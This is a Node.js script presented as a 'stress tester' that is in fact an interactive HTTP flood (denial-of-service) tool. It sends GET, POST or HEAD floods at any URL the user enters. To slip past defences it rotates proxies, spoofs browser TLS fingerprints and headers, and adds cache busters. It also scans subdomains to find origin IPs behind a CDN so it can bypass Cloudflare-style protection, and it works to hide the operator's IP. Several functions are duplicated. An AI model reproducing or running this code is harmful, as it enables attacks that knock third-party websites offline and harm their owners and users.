#!/usr/bin/env node

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const readline = require('readline');
const fs = require('fs').promises;
const dns = require('dns').promises;
const crypto = require('crypto');
const { URL } = require('url');

const BANNER = `
╔══════════════════════════════════════════════════════════╗
║    ADVANCED STRESS TESTER V5.0 - ULTRA EDITION          ║
║    HTTP/2 + Connection Pooling + Zero IP Leak           ║
║    ✓ HTTP/2 Multiplexing   ✓ Smart Proxy Health         ║
║    ✓ DoH DNS Resolution    ✓ Connection Reuse           ║
║    ✓ JA3 Randomization     ✓ Ultra-High RPS             ║
╚══════════════════════════════════════════════════════════╝
`;

const BROWSER_PROFILES = [
    {
        name: 'Chrome 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'e3b0c44298fc1c149afbf4c8996fb924',
        webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620, OpenGL 4.1)'
    },
    {
        name: 'Firefox 121 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'TE': 'trailers'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '7f83b1657ff1fc53b92dc18148a1d65d',
        webgl: 'Mozilla'
    },
    {
        name: 'Chrome 119 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'a1b2c3d4e5f6789012345678901234ab',
        webgl: 'ANGLE (Apple, Apple M1, OpenGL 4.1)'
    },
    {
        name: 'Safari 17 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '9f86d081884c7d659a2feaa0c55ad015',
        webgl: 'Apple GPU'
    },
    {
        name: 'Edge 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'b94d27b9934d3e08a52e52d7da7dabfa',
        webgl: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660, OpenGL 4.5)'
    }
];

const config = {
    proxies: [],
    workingProxies: new Set(),
    proxyHealth: new Map(),
    debug: false,
    http2Sessions: new Map(),
    connectionPool: new Map(),
    dnsCache: new Map(),
    stats: {
        totalRequests: 0,
        successful: 0,
        failed: 0,
        bytesSent: 0,
        bytesReceived: 0,
        statusCodes: {},
        startTime: null,
        http2Requests: 0,
        connectionReuse: 0
    }
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getAdvancedHeaders(url, profile = null) {
    if (!profile) profile = getRandomElement(BROWSER_PROFILES);
    
    const headers = {
        'User-Agent': profile.ua,
        'Accept': profile.headers['Accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': getRandomElement(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': getRandomElement(['document', 'empty']),
        'Sec-Fetch-Mode': getRandomElement(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': getRandomElement(['none', 'same-origin', 'cross-site', 'same-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': getRandomElement(['max-age=0', 'no-cache', 'no-store']),
        'Pragma': 'no-cache',
        ...profile.headers
    };
    
    if (profile.canvas) {
        headers['X-Canvas-Fingerprint'] = profile.canvas;
    }
    
    if (profile.webgl) {
        headers['X-WebGL-Vendor'] = profile.webgl;
    }
    
    if (Math.random() > 0.7) {
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }
    
    if (Math.random() > 0.5) {
        headers['Referer'] = url;
    }
    
    if (profile.name.includes('Chrome') || profile.name.includes('Edge')) {
        headers['sec-ch-ua-arch'] = '"x86"';
        headers['sec-ch-ua-bitness'] = '"64"';
        headers['sec-ch-ua-model'] = '""';
    }
    
    return headers;
}

function addCacheBuster(url) {
    const separator = url.includes('?') ? '&' : '?';
    const params = [
        `_=${Date.now()}`,
        `rand=${Math.floor(Math.random() * 900000) + 100000}`,
        `nocache=${crypto.randomBytes(4).toString('hex')}`
    ];
    return url + separator + getRandomElement(params);
}

function createTLSAgent(profile, proxyUrl = null) {
    const cacheKey = `${proxyUrl || 'direct'}_${profile.name}`;
    
    if (config.connectionPool.has(cacheKey)) {
        const cached = config.connectionPool.get(cacheKey);
        if (Date.now() - cached.created < 120000) {
            config.stats.connectionReuse++;
            return cached.agent;
        }
        config.connectionPool.delete(cacheKey);
    }
    
    const tlsOptions = {
        rejectUnauthorized: false,
        ciphers: profile.tls.ciphers,
        minVersion: profile.tls.minVersion,
        maxVersion: profile.tls.maxVersion,
        ecdhCurve: profile.tls.ecdhCurve,
        honorCipherOrder: true,
        sessionTimeout: 300,
        keepAlive: true,
        keepAliveMsecs: 5000,
        maxSockets: Infinity,
        maxFreeSockets: 256,
        timeout: 10000,
        scheduling: 'fifo'
    };
    
    if (profile.tls.sigalgs) {
        tlsOptions.sigalgs = profile.tls.sigalgs;
    }
    
    let agent;
    if (proxyUrl) {
        agent = proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl, tlsOptions)
            : new HttpProxyAgent(proxyUrl);
    } else {
        agent = new https.Agent(tlsOptions);
    }
    
    config.connectionPool.set(cacheKey, {
        agent,
        created: Date.now()
    });
    
    return agent;
}

async function createHTTP2Session(targetUrl, proxyUrl = null) {
    const cacheKey = `${targetUrl}_${proxyUrl || 'direct'}`;
    
    if (config.http2Sessions.has(cacheKey)) {
        const session = config.http2Sessions.get(cacheKey);
        if (!session.destroyed && !session.closed) {
            return session;
        }
        config.http2Sessions.delete(cacheKey);
    }
    
    return new Promise((resolve, reject) => {
        const url = new URL(targetUrl);
        const session = http2.connect(url.origin, {
            rejectUnauthorized: false,
            maxSessionMemory: 1000
        });
        
        session.on('error', (err) => {
            config.http2Sessions.delete(cacheKey);
            reject(err);
        });
        
        session.setTimeout(20000, () => {
            session.close();
            config.http2Sessions.delete(cacheKey);
        });
        
        config.http2Sessions.set(cacheKey, session);
        resolve(session);
    });
}

function addRealisticDelay() {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * 50) + 10;
        setTimeout(resolve, delay);
    });
}

async function resolveViaDoH(domain) {
    if (config.dnsCache.has(domain)) {
        return config.dnsCache.get(domain);
    }
    
    try {
        const dohProviders = [
            'https://cloudflare-dns.com/dns-query',
            'https://dns.google/resolve',
            'https://dns.quad9.net/dns-query'
        ];
        
        const provider = getRandomElement(dohProviders);
        const response = await axios.get(provider, {
            params: { name: domain, type: 'A' },
            headers: { 'Accept': 'application/dns-json' },
            timeout: 3000
        });
        
        if (response.data && response.data.Answer) {
            const ip = response.data.Answer[0].data;
            config.dnsCache.set(domain, ip);
            return ip;
        }
    } catch (err) {
        // Fallback to system DNS
    }
    
    return domain;
}

function updateProxyHealth(proxyUrl, success, latency) {
    if (!config.proxyHealth.has(proxyUrl)) {
        config.proxyHealth.set(proxyUrl, {
            success: 0,
            fails: 0,
            totalLatency: 0,
            requests: 0,
            score: 100
        });
    }
    
    const health = config.proxyHealth.get(proxyUrl);
    health.requests++;
    
    if (success) {
        health.success++;
        health.totalLatency += latency;
    } else {
        health.fails++;
    }
    
    const successRate = health.success / health.requests;
    const avgLatency = health.totalLatency / health.success || 9999;
    health.score = (successRate * 70) + ((1000 - Math.min(avgLatency, 1000)) / 1000 * 30);
}

function getHealthyProxy() {
    if (config.proxies.length === 0) return null;
    
    const healthyProxies = config.proxies.filter(proxy => {
        const health = config.proxyHealth.get(proxy);
        return !health || health.score > 30;
    });
    
    if (healthyProxies.length === 0) {
        config.proxyHealth.clear();
        return getRandomElement(config.proxies);
    }
    
    healthyProxies.sort((a, b) => {
        const scoreA = config.proxyHealth.get(a)?.score || 100;
        const scoreB = config.proxyHealth.get(b)?.score || 100;
        return scoreB - scoreA;
    });
    
    const topTier = healthyProxies.slice(0, Math.ceil(healthyProxies.length * 0.3));
    return getRandomElement(topTier);
}

async function resolveViaDoH(domain) {
    if (config.dnsCache.has(domain)) {
        return config.dnsCache.get(domain);
    }
    
    try {
        const dohProviders = [
            'https://cloudflare-dns.com/dns-query',
            'https://dns.google/resolve',
            'https://dns.quad9.net/dns-query'
        ];
        
        const provider = getRandomElement(dohProviders);
        const response = await axios.get(provider, {
            params: { name: domain, type: 'A' },
            headers: { 'Accept': 'application/dns-json' },
            timeout: 3000
        });
        
        if (response.data && response.data.Answer) {
            const ip = response.data.Answer[0].data;
            config.dnsCache.set(domain, ip);
            return ip;
        }
    } catch (err) {
        // Fallback to system DNS through proxy
    }
    
    return domain;
}

function updateProxyHealth(proxyUrl, success, latency) {
    if (!config.proxyHealth.has(proxyUrl)) {
        config.proxyHealth.set(proxyUrl, {
            success: 0,
            fails: 0,
            totalLatency: 0,
            requests: 0,
            score: 100
        });
    }
    
    const health = config.proxyHealth.get(proxyUrl);
    health.requests++;
    
    if (success) {
        health.success++;
        health.totalLatency += latency;
    } else {
        health.fails++;
    }
    
    const successRate = health.success / health.requests;
    const avgLatency = health.totalLatency / health.success || 9999;
    health.score = (successRate * 70) + ((1000 - Math.min(avgLatency, 1000)) / 1000 * 30);
}

function getHealthyProxy() {
    if (config.proxies.length === 0) return null;
    
    const healthyProxies = config.proxies.filter(proxy => {
        const health = config.proxyHealth.get(proxy);
        return !health || health.score > 30;
    });
    
    if (healthyProxies.length === 0) {
        config.proxyHealth.clear();
        return getRandomElement(config.proxies);
    }
    
    healthyProxies.sort((a, b) => {
        const scoreA = config.proxyHealth.get(a)?.score || 100;
        const scoreB = config.proxyHealth.get(b)?.score || 100;
        return scoreB - scoreA;
    });
    
    const topTier = healthyProxies.slice(0, Math.ceil(healthyProxies.length * 0.3));
    return getRandomElement(topTier);
}

async function loadProxies(filePath = 'proxies.txt') {
    try {
        const data = await fs.readFile(filePath, 'utf-8');
        const raw = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        
        if (raw.length === 0) {
            console.log('[!] No proxies found in proxies.txt');
            console.log('[!] Format: ip:port (one per line)');
            return false;
        }
        
        console.log('\n' + '='.repeat(70));
        console.log(`[*] LOADING PROXIES`);
        console.log('='.repeat(70));
        
        config.proxies = raw.map(proxy => 
            proxy.startsWith('http') ? proxy : `http://${proxy}`
        );
        
        console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
        console.log(`[+] Proxies will be used in rotation during attack`);
        console.log('='.repeat(70) + '\n');
        
        return true;
    } catch (err) {
        console.log('[!] proxies.txt not found!');
        console.log('[!] Create proxies.txt with format: ip:port (one per line)\n');
        return false;
    }
}

async function discoverOriginIPs(domain) {
    console.log(`[*] Discovering origin IPs for ${domain}...`);
    const foundIPs = new Set();
    
    const subdomains = [
        'direct', 'origin', 'direct-connect', 'direct-origin',
        'dev', 'staging', 'test', 'beta', 'alpha',
        'admin', 'panel', 'cpanel', 'webmail',
        'mail', 'smtp', 'ftp', 'api', 'api2'
    ];
    
    console.log(`[*] Scanning ${subdomains.length} subdomains...`);
    
    const cdnRanges = ['104.', '172.', '162.', '13.', '34.', '35.', '54.', '52.', '23.', '95.', '96.', '151.'];
    
    await Promise.all(subdomains.map(async sub => {
        try {
            const testDomain = `${sub}.${domain}`;
            const addresses = await dns.resolve4(testDomain);
            addresses.forEach(ip => {
                if (!cdnRanges.some(range => ip.startsWith(range))) {
                    foundIPs.add(ip);
                    console.log(`  [+] Found: ${testDomain} -> ${ip}`);
                }
            });
        } catch {}
    }));
    
    try {
        const mainIPs = await dns.resolve4(domain);
        mainIPs.forEach(ip => foundIPs.add(ip));
    } catch {}
    
    if (foundIPs.size > 0) {
        console.log(`[+] Discovered ${foundIPs.size} potential origin IPs`);
        return Array.from(foundIPs);
    } else {
        console.log('[!] No origin IPs found, using domain directly');
        return [domain];
    }
}

function updateStats(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
    config.stats.totalRequests++;
    if (success) {
        config.stats.successful++;
    } else {
        config.stats.failed++;
    }
    config.stats.bytesSent += bytesSent;
    config.stats.bytesReceived += bytesReceived;
    
    if (statusCode) {
        config.stats.statusCodes[statusCode] = (config.stats.statusCodes[statusCode] || 0) + 1;
    }
}

function displayStats() {
    const elapsed = (Date.now() - config.stats.startTime) / 1000;
    const reqRate = config.stats.totalRequests / elapsed;
    const successRate = config.stats.totalRequests > 0 
        ? (config.stats.successful / config.stats.totalRequests * 100).toFixed(1)
        : 0;
    const http2Percent = config.stats.totalRequests > 0
        ? ((config.stats.http2Requests / config.stats.totalRequests) * 100).toFixed(1)
        : 0;
    
    console.log('\n' + '='.repeat(70));
    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests} | Rate: ${reqRate.toFixed(1)} req/s`);
    console.log(`[STATS] Success: ${config.stats.successful} (${successRate}%) | Failed: ${config.stats.failed}`);
    console.log(`[STATS] HTTP/2: ${config.stats.http2Requests} (${http2Percent}%) | Conn Reuse: ${config.stats.connectionReuse}`);
    console.log(`[STATS] Sent: ${(config.stats.bytesSent / 1024).toFixed(1)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(1)} KB`);
    
    if (Object.keys(config.stats.statusCodes).length > 0) {
        const codes = Object.entries(config.stats.statusCodes)
            .sort(([a], [b]) => a - b)
            .map(([k, v]) => `${k}:${v}`)
            .join(', ');
        console.log(`[STATS] Status Codes: ${codes}`);
    }
    
    if (config.proxies.length > 0 && config.workingProxies.size > 0) {
        const workingIPs = Array.from(config.workingProxies).slice(0, 10).join(', ');
        const extra = config.workingProxies.size > 10 ? ` ... (+${config.workingProxies.size - 10} more)` : '';
        console.log(`[STATS] Working Proxies: ${config.workingProxies.size} | IPs: ${workingIPs}${extra}`);
    }
    
    console.log('='.repeat(70));
}

class HTTPFlood {
    constructor(url, duration, threads, method, useOrigin) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.method = method;
        this.useOrigin = useOrigin;
        this.running = false;
        this.originIPs = [];
        this.domain = new URL(url).hostname;
    }
    
    async prepare() {
        console.log(`\n[*] Preparing ${this.method} flood attack...`);
        console.log(`[*] Target: ${this.url}`);
        console.log(`[*] Duration: ${this.duration}s`);
        console.log(`[*] Threads: ${this.threads}`);
        console.log(`[*] Mode: ULTRA-ADVANCED (5 concurrent/thread + HTTP/2)`);
        console.log(`[*] JA3: Valid browser fingerprints + randomization`);
        console.log(`[*] Protocol: HTTP/1.1 + HTTP/2 multiplexing (70%)`);
        console.log(`[*] Connection: Pooled + Keep-Alive + Reuse`);
        console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
        
        const estimatedRPS = this.threads * 500;
        console.log(`[*] Estimated throughput: ${estimatedRPS}-${estimatedRPS * 3} req/s`);
        
        if (this.useOrigin && this.domain) {
            this.originIPs = await discoverOriginIPs(this.domain);
        }
        
        if (config.proxies.length > 0) {
            console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
            config.workingProxies.clear();
        } else {
            console.log('[!] WARNING: Direct connection - your IP is visible!');
        }
        
        config.stats.startTime = Date.now();
        this.running = true;
    }
    
    async worker(threadId) {
        let currentProxy = config.proxies.length > 0 ? getHealthyProxy() : null;
        let localCount = 0;
        const useHTTP2 = Math.random() > 0.3;
        
        const profile = getRandomElement(BROWSER_PROFILES);
        let cachedAgent = createTLSAgent(profile, currentProxy);
        
        const endTime = Date.now() + this.duration * 1000;
        
        while (this.running && Date.now() < endTime) {
            const concurrent = config.proxies.length > 0 ? 5 : 3;
            const requests = [];
            
            for (let i = 0; i < concurrent; i++) {
                const requestPromise = (async () => {
                    const startTime = Date.now();
                    try {
                        const randomProfile = Math.random() > 0.5 ? getRandomElement(BROWSER_PROFILES) : profile;
                        const headers = getAdvancedHeaders(this.url, randomProfile);
                        
                        let targetUrl = this.url;
                        if (this.originIPs.length > 0 && this.useOrigin) {
                            const originIP = getRandomElement(this.originIPs);
                            if (originIP !== this.domain) {
                                targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
                                headers['Host'] = this.domain;
                            }
                        }
                        
                        targetUrl = addCacheBuster(targetUrl);
                        
                        if (useHTTP2 && targetUrl.startsWith('https') && Math.random() > 0.5) {
                            try {
                                const session = await createHTTP2Session(targetUrl, currentProxy);
                                const req = session.request({
                                    ':method': this.method,
                                    ':path': new URL(targetUrl).pathname + new URL(targetUrl).search,
                                    ...headers
                                });
                                
                                req.setEncoding('utf8');
                                let data = '';
                                req.on('data', (chunk) => { data += chunk; });
                                
                                await new Promise((resolve, reject) => {
                                    req.on('end', () => resolve());
                                    req.on('error', reject);
                                    req.setTimeout(1200, () => {
                                        req.close();
                                        resolve();
                                    });
                                });
                                
                                const latency = Date.now() - startTime;
                                updateStats(true, 200, JSON.stringify(headers).length, data.length);
                                config.stats.http2Requests++;
                                
                                if (currentProxy) {
                                    updateProxyHealth(currentProxy, true, latency);
                                }
                            } catch (http2Error) {
                                throw http2Error;
                            }
                        } else {
                            const axiosConfig = {
                                method: this.method.toLowerCase(),
                                url: targetUrl,
                                headers,
                                timeout: 1200,
                                maxRedirects: 5,
                                validateStatus: () => true,
                                httpsAgent: cachedAgent,
                                httpAgent: cachedAgent,
                                proxy: false,
                                decompress: false
                            };
                            
                            if (this.method === 'POST') {
                                axiosConfig.data = crypto.randomBytes(256).toString('hex');
                            }
                            
                            const response = await axios(axiosConfig);
                            const latency = Date.now() - startTime;
                            
                            const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? axiosConfig.data.length : 0);
                            const bytesReceived = response.data ? String(response.data).length : 0;
                            
                            updateStats(true, response.status, bytesSent, bytesReceived);
                            
                            if (currentProxy) {
                                updateProxyHealth(currentProxy, true, latency);
                                if (localCount % 30 === 0) {
                                    const proxyIP = currentProxy.replace(/^https?:\/\//, '').split(':')[0];
                                    config.workingProxies.add(proxyIP);
                                }
                            }
                        }
                        
                        if (config.debug && localCount % 250 === 0) {
                            const proto = useHTTP2 ? 'HTTP/2' : 'HTTP/1.1';
                            console.log(`[DEBUG] T${threadId}: ${proto} - ${profile.name} - Reuse: ${config.stats.connectionReuse}`);
                        }
                        
                        localCount++;
                        
                    } catch (error) {
                        const latency = Date.now() - startTime;
                        updateStats(false);
                        
                        if (currentProxy) {
                            updateProxyHealth(currentProxy, false, latency);
                            
                            const health = config.proxyHealth.get(currentProxy);
                            if (health && health.score < 30) {
                                currentProxy = getHealthyProxy();
                                cachedAgent = createTLSAgent(profile, currentProxy);
                            }
                        }
                        
                        if (config.debug && localCount % 100 === 0) {
                            console.log(`[DEBUG] T${threadId}: ${error.code || error.message}`);
                        }
                    }
                })();
                
                requests.push(requestPromise);
            }
            
            await Promise.allSettled(requests);
            
            if (localCount % 50 === 0 && currentProxy) {
                const health = config.proxyHealth.get(currentProxy);
                if (health && health.score < 40) {
                    currentProxy = getHealthyProxy();
                    cachedAgent = createTLSAgent(profile, currentProxy);
                }
            }
        }
    }
    
    async start() {
        await this.prepare();
        
        console.log(`[*] Starting attack with ${this.threads} async workers...`);
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker(i));
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => {
            this.running = false;
        }, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        
        displayStats();
        console.log('\n[+] Attack completed!');
    }
}

async function main() {
    console.log(BANNER);
    
    const debugInput = await question('[?] Enable debug mode? (y/n): ');
    config.debug = debugInput.toLowerCase() === 'y';
    
    const proxyInput = await question('[?] Use proxies? (y/n): ');
    if (proxyInput.toLowerCase() === 'y') {
        const loaded = await loadProxies();
        if (!loaded) {
            console.log('[!] Continuing without proxies - YOUR IP WILL BE VISIBLE!');
        }
    }
    
    console.log('\n[SELECT ATTACK TYPE]');
    console.log('  1. HTTP GET Flood (Ultra-Fast)');
    console.log('  2. HTTP POST Flood (Ultra-Fast)');
    console.log('  3. HTTP HEAD Flood');
    
    const choice = await question('\n[>] Select attack (1-3): ');
    
    if (['1', '2', '3'].includes(choice)) {
        const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
        
        let finalUrl = url.trim();
        if (!finalUrl.startsWith('http')) {
            finalUrl = 'https://' + finalUrl;
            console.log(`[*] Added HTTPS protocol: ${finalUrl}`);
        }
        
        const duration = parseInt(await question('[>] Duration (seconds): '));
        const threads = parseInt(await question('[>] Number of threads (10-500): '));
        
        const bypassCF = await question('[?] Attempt Cloudflare/CDN bypass? (y/n): ');
        const useOrigin = bypassCF.toLowerCase() === 'y';
        
        const method = choice === '1' ? 'GET' : choice === '2' ? 'POST' : 'HEAD';
        
        const attack = new HTTPFlood(finalUrl, duration, threads, method, useOrigin);
        await attack.start();
    } else {
        console.log('[!] Invalid choice!');
    }
    
    rl.close();
    process.exit(0);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\n[!] Error:', err.message);
        rl.close();
        process.exit(1);
    });
}
